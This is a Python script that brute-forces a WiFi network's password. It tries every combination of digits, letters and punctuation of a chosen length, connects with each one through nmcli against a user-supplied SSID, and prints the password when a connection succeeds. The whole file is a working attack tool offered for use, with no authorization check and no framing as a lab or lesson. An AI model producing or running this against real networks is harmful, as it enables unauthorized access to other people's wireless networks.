import string
import sys
import subprocess
import time

# =============================================================================
# 1. Full character set
# =============================================================================
characters = list(
    string.digits +           # 0-9
    string.ascii_lowercase +  # a-z
    string.ascii_uppercase +  # A-Z
    string.punctuation        # All special characters
)

print(f"Total characters available: {len(characters)}")
print("Character set:", "".join(characters))
print("-" * 80)


# =============================================================================
# 2. Real WiFi connection function for Linux (nmcli)
# =============================================================================
def wifi_connects(ssid: str, password: str, timeout: int = 12) -> bool:
    """
    Tries to connect to WiFi using nmcli on Linux.
    Returns True if connection is successful.
    """
    try:
        print(f"   [TESTING] {password}", end=" → ")

        # Disconnect from current network first (helps avoid conflicts)
        subprocess.run(["nmcli", "device", "disconnect", "wlan0"], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)

        # Try to connect
        result = subprocess.run(
            ["nmcli", "device", "wifi", "connect", ssid, "password", password],
            capture_output=True,
            text=True,
            timeout=timeout
        )

        # Check for success
        if result.returncode == 0 or "successfully activated" in result.stdout.lower():
            print("CONNECTED!")
            return True
        else:
            # Optional: show error only for first few attempts or when debugging
            print(" Failed")
            return False

    except subprocess.TimeoutExpired:
        print("Timeout")
        return False
    except Exception as e:
        print(f" Error: {e}")
        return False


# =============================================================================
# 3. Backtracking function
# =============================================================================
def find_password_with_backtracking(ssid: str, n: int):
    def backtrack(current: str) -> str | None:
        if len(current) == n:
            if wifi_connects(ssid, current):
                return current
            return None

        for char in characters:
            result = backtrack(current + char)
            if result is not None:
                return result  # Stop as soon as we find the correct password
        return None

    print(f"\nStarting search for {n}-character password on '{ssid}'...")
    print("This may take a very long time. Press Ctrl+C to stop.\n")
    
    return backtrack("")


# =============================================================================
# MAIN
# =============================================================================
if __name__ == "__main__":
    try:
        ssid = input("Enter WiFi SSID: ").strip()
        if not ssid:
            print("SSID cannot be empty!")
            sys.exit(1)

        n = int(input("Enter password length: "))
        if n < 1:
            print("Length must be >= 1")
            sys.exit(1)

        found = find_password_with_backtracking(ssid, n)

        if found:
            print("\n" + "="*70)
            print("PASSWORD FOUND!")
            print(f"SSID     : {ssid}")
            print(f"Password : {found}")
            print("="*70)
        else:
            print("\nSearch completed. No password found.")

    except KeyboardInterrupt:
        print("\n\nSearch stopped by user.")
    except ValueError:
        print("Please enter a valid number for length.")
    except Exception as e:
        print(f"Error: {e}")
